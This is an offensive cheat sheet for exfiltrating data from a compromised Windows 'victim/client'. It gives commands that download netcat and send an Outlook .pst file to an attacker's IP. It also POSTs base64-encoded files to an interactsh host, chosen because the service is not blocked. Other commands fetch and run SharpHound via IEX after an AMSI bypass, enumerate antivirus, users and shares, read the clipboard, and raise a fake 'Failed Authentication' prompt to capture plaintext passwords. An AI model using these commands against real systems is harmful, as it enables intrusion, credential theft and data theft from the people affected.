# Exfiltrate and find data and info
On victim/client:

In powershell shell (powershell has the wget command):
```cmd
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe -Outfile nc.exe
cmd /c 'nc.exe -w 3 <yourIP> 80 < Outlook.pst'
```

On receiving server:

```bash
nc -l -p 80 > Outlook.pst
```


Or via HTTP requests (interact.sh service):

First go to interactsh.com and copy the unique link you get.

file/pdf extraction via public service which is used legitimate and thus not blocked:
```powershell
$File = "file.pdf"
$uri = "ID.interactsh.com" # change the ID 
$pdf = Get-Content $File -Encoding Byte; 
$base64 =[Convert]::ToBase64String($pdf)
Invoke-WebRequest -uri $uri -Method Post -Body $base64
```

Use https://base64.guru/converter/decode/file#download-preview-file to get the file from the base64 content

bloodhound:
```powershell
# FIRST run AMSI bypass! 
$url = "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1"
IEX([Net.Webclient]::new().DownloadString($url))
mkdir "$Env:PUBLIC\bloodhound"
Invoke-BloodHound -CollectionMethod ACL,ObjectProps,Default  -OutputDirectory "$Env:PUBLIC\bloodhound"
# use file/pdf extraction to get the zip file. 
```

View AV used:
```powershell
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List #Powershell
```

View information about current user:
```powershell
whoami
net user <name_user_whoami_without_domain> /domain
hostname
```

Show mounted shares:
```
Get-WmiObject Win32_NetworkConnection | ft "LocalName","RemoteName" -A #powershell
net use # cmd
```

Get clipboard content: 

```powershell
powershell -command "Get-Clipboard"
```
Ask for credentials:
```powershell
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

# Additional commands
https://github.com/r00t-3xp10it/venom/wiki/CmdLine-&-Scripts-for-reverse-TCP-shell-addicts
